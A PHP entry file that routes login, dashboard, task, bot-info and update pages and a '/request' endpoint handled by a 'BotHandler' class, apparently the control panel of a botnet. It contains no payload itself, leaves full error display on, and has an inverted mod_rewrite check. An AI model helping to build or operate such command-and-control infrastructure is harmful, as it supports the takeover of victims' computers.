<?php

session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$installer = true;

if(file_exists( __DIR__ . '/../../config.php')){
    $installer = false;
    require_once __DIR__ . '/../../config.php';
}
require 'vendor/autoload.php';
include  __DIR__ . '/src/Geo/geoip.inc';
require_once __DIR__ . '/src/Classes/Bramus/Router/Router.php';
require  __DIR__ . '/src/Classes/Smarty/Smarty.class.php';
require  __DIR__ . '/src/Controllers/Public/BotHandler.class.php';
require  __DIR__ . '/src/Controllers/Public/Install.class.php';
require  __DIR__ . '/src/Controllers/Public/Update.class.php';

$tpl = new Smarty;
$router = new \Bramus\Router\Router();
use GeoIp2\Database\Reader;


if(!$installer){
    require  __DIR__ . '/src/Controllers/Public/Main.class.php';
    $router->all('/login', 'Main@login');
    $router->all('/request', 'BotHandler@request');
    $router->all('/dashboard', 'Main@index');
         $router->all('/tasks', 'Main@tasks');
    $router->all('/tasks/(\d+)', 'Main@tasks');
    $router->all('/logout', 'Main@logout');
    $router->all('/settings', 'Main@settings');
    $router->all('/taskdetails/(\d+)', 'Main@taskdetails');    
    $router->all('/edituser/(\d+)', 'Main@edituser');    
    $router->all('/botinfo/(\d+)', 'Main@botinfo');
    $router->all('/version_check', 'Update@version_check');
    $router->all('/doUpdate', 'Update@doUpdate');
}else{
    $router->all('/install', 'install@index');
}





$template = explode("@",$router->fn);
$router->run(function() use ($tpl) {
    $tpl->caching = false;
    $tpl->compile_check = true;
    $tpl->force_compile  = true;
    $tpl->setTemplateDir(__DIR__."/templates/v1/");
    $templateDir = $GLOBALS["template"][0]."/".$GLOBALS["template"][1].".tpl";
    $GLOBALS["tpl"]->assign("includeDir", "/versions/2.0/templates/v1/");
    $tpl->display($templateDir);
});

if($installer){

    if(strpos(shell_exec('/usr/local/apache/bin/apachectl -l'), 'mod_rewrite') !== false){
        echo "Please Enable Apache Mod Rewrite (Enable .htaccess)";
        die();
    }

    if( $_SERVER['REQUEST_URI'] != "/install"){
        Header("Location: /install");
    }
}

?>

